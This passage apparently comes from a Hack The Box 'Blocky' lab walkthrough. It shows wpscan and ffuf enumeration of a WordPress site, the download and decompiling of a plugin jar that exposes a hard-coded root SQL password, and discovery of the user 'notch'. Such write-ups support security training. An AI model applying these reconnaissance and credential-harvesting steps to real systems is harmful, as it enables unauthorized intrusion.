+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 &lt;=============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Tue Jan 28 22:32:43 2025
+[+] Requests Done: 180
+[+] Cached Requests: 5
+[+] Data Sent: 43.018 KB
+[+] Data Received: 13.644 MB
+[+] Memory used: 281.621 MB
+[+] Elapsed time: 00:00:07
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-44227" onclick="terminalOverlayClose('bash-bash-44227')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-44227')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-44227')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-44227')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-44227" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ wpscan --url http://blocky.htb                
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]Y
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://blocky.htb/ [10.10.10.37]
+[+] Started: Tue Jan 28 22:32:36 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://blocky.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://blocky.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+ |  - http://blocky.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
+ | Last Updated: 2024-11-12T00:00:00.000Z
+ | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 3.8
+ | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 &lt;=============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Tue Jan 28 22:32:43 2025
+[+] Requests Done: 180
+[+] Cached Requests: 5
+[+] Data Sent: 43.018 KB
+[+] Data Received: 13.644 MB
+[+] Memory used: 281.621 MB
+[+] Elapsed time: 00:00:07
+</pre> </div> </div> <p><br> Ffuf the webserver to find any interesting directories.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42507"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42507')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42507')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42507')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42507')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42507">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blocky.htb/FUZZ -e .txt,.bak,.php -fw 3306
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://blocky.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Extensions       : .txt .bak .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 3306
+________________________________________________
+
+.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 18ms]
+index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
+wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 18ms]
+wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 12ms]
+wp-login.php            [Status: 200, Size: 2397, Words: 147, Lines: 70, Duration: 32ms]
+plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 14ms]
+license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 35ms]
+wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 16ms]
+javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 35ms]
+wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 61ms]
+wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 22ms]
+phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 12ms]
+xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 48ms]
+.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 18ms]
+wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
+server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 16ms]
+:: Progress: [882236/882236] :: Job [1/1] :: 2564 req/sec :: Duration: [0:08:39] :: Errors: 0 ::
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42507" onclick="terminalOverlayClose('bash-bash-42507')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42507')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42507')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42507')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42507" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blocky.htb/FUZZ -e .txt,.bak,.php -fw 3306
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://blocky.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Extensions       : .txt .bak .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 3306
+________________________________________________
+
+.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 18ms]
+index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
+wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 18ms]
+wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 12ms]
+wp-login.php            [Status: 200, Size: 2397, Words: 147, Lines: 70, Duration: 32ms]
+plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 14ms]
+license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 35ms]
+wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 16ms]
+javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 35ms]
+wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 61ms]
+wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 22ms]
+phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 12ms]
+xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 48ms]
+.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 18ms]
+wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
+server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 16ms]
+:: Progress: [882236/882236] :: Job [1/1] :: 2564 req/sec :: Duration: [0:08:39] :: Errors: 0 ::
+</pre> </div> </div> <p><br> Check the plugins folder that was discovered during the brute-force.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/blocky/files.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Plugins Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Download the BlockyCore.jar file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4704"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4704')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4704')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4704')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4704')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4704">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ wget http://blocky.htb/plugins/files/BlockyCore.jar
+--2025-01-28 23:06:53--  http://blocky.htb/plugins/files/BlockyCore.jar
+Resolving blocky.htb (blocky.htb)... 10.10.10.37
+Connecting to blocky.htb (blocky.htb)|10.10.10.37|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 883 [application/java-archive]
+Saving to: ‘BlockyCore.jar’
+
+BlockyCore.jar                                             100%[========================================================================================================================================&gt;]     883  --.-KB/s    in 0s      
+
+2025-01-28 23:06:53 (144 MB/s) - ‘BlockyCore.jar’ saved [883/883]
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4704" onclick="terminalOverlayClose('bash-bash-4704')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4704')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4704')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4704')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4704" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ wget http://blocky.htb/plugins/files/BlockyCore.jar
+--2025-01-28 23:06:53--  http://blocky.htb/plugins/files/BlockyCore.jar
+Resolving blocky.htb (blocky.htb)... 10.10.10.37
+Connecting to blocky.htb (blocky.htb)|10.10.10.37|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 883 [application/java-archive]
+Saving to: ‘BlockyCore.jar’
+
+BlockyCore.jar                                             100%[========================================================================================================================================&gt;]     883  --.-KB/s    in 0s      
+
+2025-01-28 23:06:53 (144 MB/s) - ‘BlockyCore.jar’ saved [883/883]
+</pre> </div> </div> <p><br> Run jd-gui to decompile the BlockyCore.jar file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4185"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4185')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4185')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4185')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4185')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4185">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ jd-gui BlockyCore.jar                                        
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4185" onclick="terminalOverlayClose('bash-bash-4185')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4185')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4185')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4185')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4185" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ jd-gui BlockyCore.jar                                        
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+</pre> </div> </div> <p><br> Run jd-gui to decompile the BlockyCore.jar file.</p> <div class="terminal" data-language="java" id="terminal-blockycore-jar-java-14436"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('blockycore-jar-java-14436')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('blockycore-jar-java-14436')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('blockycore-jar-java-14436')" title="Maximize"></button> </div> <span class="terminal__title">BlockyCore.jar</span> <button class="terminal__copy" onclick="terminalCopy('blockycore-jar-java-14436')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-blockycore-jar-java-14436">
+package com.myfirstplugin;
+
+public class BlockyCore {
+  public String sqlHost = "localhost";
+  
+  public String sqlUser = "root";
+  
+  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
+  
+  public void onServerStart() {}
+  
+  public void onServerStop() {}
+  
+  public void onPlayerJoin() {
+    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
+  }
+  
+  public void sendMessage(String username, String message) {}
+</pre> </div> <div class="terminal__overlay" id="overlay-blockycore-jar-java-14436" onclick="terminalOverlayClose('blockycore-jar-java-14436')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('blockycore-jar-java-14436')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('blockycore-jar-java-14436')" title="Restore"></button> </div> <span class="terminal__title">BlockyCore.jar</span> <button class="terminal__copy" onclick="terminalCopyModal('blockycore-jar-java-14436')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-blockycore-jar-java-14436" data-language="java">
+package com.myfirstplugin;
+
+public class BlockyCore {
+  public String sqlHost = "localhost";
+  
+  public String sqlUser = "root";
+  
+  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
+  
+  public void onServerStart() {}
+  
+  public void onServerStop() {}
+  
+  public void onPlayerJoin() {
+    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
+  }
+  
+  public void sendMessage(String username, String message) {}
+</pre> </div> </div> <p><br> Review the code and note the sqlPass variable.</p> <div class="terminal" data-language="java" id="terminal-blockycore-jar-java-1470"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('blockycore-jar-java-1470')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('blockycore-jar-java-1470')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('blockycore-jar-java-1470')" title="Maximize"></button> </div> <span class="terminal__title">BlockyCore.jar</span> <button class="terminal__copy" onclick="terminalCopy('blockycore-jar-java-1470')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-blockycore-jar-java-1470">
+
+&lt;snip&gt;
+
+public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
+
+&lt;snip&gt;
+
+</pre> </div> <div class="terminal__overlay" id="overlay-blockycore-jar-java-1470" onclick="terminalOverlayClose('blockycore-jar-java-1470')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('blockycore-jar-java-1470')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('blockycore-jar-java-1470')" title="Restore"></button> </div> <span class="terminal__title">BlockyCore.jar</span> <button class="terminal__copy" onclick="terminalCopyModal('blockycore-jar-java-1470')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-blockycore-jar-java-1470" data-language="java">
+
+&lt;snip&gt;
+
+public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
+
+&lt;snip&gt;
+
+</pre> </div> </div> <p><br> Use the wpscan to try and enumerate the users of the Wordpress installation.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4483"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4483')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4483')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4483')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4483')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4483">
+&lt;snip&gt;
+
+[i] User(s) Identified:
+
+[+] notch
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Notch
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+ &lt;snip&gt;
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4483" onclick="terminalOverlayClose('bash-bash-4483')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4483')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4483')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4483')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4483" data-language="bash">
+&lt;snip&gt;
+
+[i] User(s) Identified:
+
+[+] notch
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Notch
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+ &lt;snip&gt;
